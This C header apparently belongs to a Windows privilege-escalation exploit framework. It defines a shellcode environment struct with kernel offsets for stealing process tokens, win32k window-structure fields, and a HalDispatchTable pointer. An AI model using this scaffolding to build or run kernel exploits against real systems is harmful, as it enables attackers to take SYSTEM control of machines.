#pragma once
#include "..\StringTable.h"
#include "ApiStub.h"
#include "EggTag.h"
#define TAG_SIZE (2)
#define DATA_TAG (0xbadda55)
#define ENVIRONMENT_TAG ((DWORD_PTR)0x88888888)

#define TEST_FLAG(x, y) (((x)&(y))==(y))

#define CURRENT_PID					(0)
#define PARENT_PID					((DWORD)(-1))

#define NO_PROCESS  				((WORD)(-1))

#define ENV_SUCCESS					( 0)
#define ENV_FAILURE					(-1)
#define ENV_INVALID_PARAMETER		(-2)

#define ENV_NATIVE_FAILURE	    	(-3)
#define ENV_NATIVE_OUT_OF_MEM   	(-4)
#define ENV_TOKEN_NOT_FOUND			(-5)

typedef struct _OFFSET
{
	DWORD dwTokenOffset;      // Retrieves the offset of token in EPROCESS structure in current operating system.
	DWORD dwKprocessOffset;   // Retrieves the offset of _KPROCESS in PTI structure in current operating system.
	DWORD dwActiveProcessLinksOffset;   // Retrieves the offset of ActiveProcessLinks in _KPROCESS structure in current operating system.
	DWORD dwUIdOffset;   // Retrieves the offset of UniqueProcessId in _EPROCESS structure in current operating system.

	DWORD dwWndProcOffset;    // Retrieves the offset of WindowProc in _HWNDtag structure in current operating system.
	DWORD dwThreadInfoOffset; // Retrieves the offset of threadInfo in _HWNDtag structure in current operating system.
	DWORD dwServerSideOffset; // Retrieves the offset of bServerSide Bit in _HWNDtag structure in current operating system.
}OFFSET, *LPOFFSET;

typedef struct _WINAPI_TABLE *LPWINAPI_TABLE;
#pragma pack(push, 1)
struct _ENVIRONMENT 
{
	DWORD			 dwTag[TAG_SIZE];
	LPVOID			 lpCodeEgg;		  // a pointer to EggTag() function 
	DWORD			 dwEntryPointEva; //  = entry point - EggTag()
	DWORD			 dwCodeSize;	  // size of main code
	STRING_TABLE *	 lpString;		  //  = lpString - offset _ENVIRONMENT
	LPWINAPI_TABLE	 lpWinapiTable;	  //  = lpWinapiTable  - offset _ENVIRONMENT
	DWORD_PTR        dwUserData;	  // user-defined data
	
	BOOL			 bIsWow64Process; // Determines whether the specified process is running under WOW64.
	BOOL			 bSystemToken;	  // Determines whether we have system token.
	DWORD			 dwCurrentPid;    // Retrieves the process identifier of the calling process.
	OSVERSIONINFOEXA osver;			  // Retrieves information about the current operating system.
	OFFSET			 offset;
	PVOID			 pteb;			  // pointer to TEB of current process
	PVOID			 ppeb;			  // pointer to PEB of current process
	PVOID			 pti;			  // Retrieves the offset of PTI in _HWNDtag 
									  //   structure in current operating system.
	PVOID            pse;			  // win32k!gSharedInfo pointer
	PVOID			 kHalDsipatchTable;
};
#pragma pack(pop)
typedef struct _ENVIRONMENT ENVIRONMENT;
typedef struct _ENVIRONMENT *LPENVIRONMENT; 

#ifdef WIN_EOP_FRAMEWORK
// Call Windows API
#define CWA(env, api) (((LPENVIRONMENT)(env))->lpWinapiTable)->##api
#define GET_FUNCTION_ADDRESS(env, f) ((LPVOID)( ((DWORD_PTR)f - (DWORD_PTR)EggTag) + (DWORD_PTR)env->lpCodeEgg ))
#else 
#define CWA(env, api) ::api
#define GET_FUNCTION_ADDRESS(env, f) ((LPVOID)((DWORD_PTR)f))
#endif // WIN_EOP_FRAMEWORK

#define __MALLOC__(nByte) (CWA(env, GlobalAlloc)(GPTR, nByte))
#define __FREE__(p) (CWA(env, GlobalFree)(p))

